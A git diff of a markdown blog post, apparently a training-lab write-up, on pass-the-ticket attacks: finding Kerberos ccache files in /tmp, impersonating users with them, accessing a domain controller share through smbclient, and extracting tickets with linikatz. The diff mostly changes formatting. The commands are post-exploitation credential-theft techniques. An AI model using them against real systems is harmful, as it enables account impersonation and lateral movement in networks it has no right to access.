@@ -1,16 +1,22 @@
 ---
-title: "PTT : Abusing KeyTab ccache"
+title: 'PTT : Abusing KeyTab ccache'
 date: 2025-11-29 21:27:07
 categories:
   - Active Directory
   - Linux
   - Post Exploitation
   - Pass the Ticket (Ptt)
-  - KeyTab Ccache Abuse
+  - KeyTab Ccache Abuse 
+
 tags:
   - klist
   - ccache
+
+cover: /img/ptt.png
+top_img: /img/bg-img.jpg
+description:
 ---
+
 
 # Finding ccache files
 
@@ -24,7 +30,7 @@ KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
 
 #### Searching for ccache files in /tmp
 
-`➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.`
+`➜ if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.`
 
 ```bash
 ls -la /tmp
@@ -33,6 +39,8 @@ ls -la /tmp
 -rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
 -rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
 ```
+
+
 
 # Abusing KeyTab ccache
 
@@ -69,13 +77,15 @@ smbclient //dc01/C$ -k -c ls -no-pass
 
 `➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.`
 
+
 ```bash
 [!bash!]$ /opt/linikatz.sh
+
 
 Valid starting       Expires              Service principal
 10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
     renew until 10/11/2022 19:48:03, Flags: RIA
-    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types:
+    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
 I: [kerberos-check] User Kerberos tickets
 Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
 Default principal: julio@INLANEFREIGHT.HTB
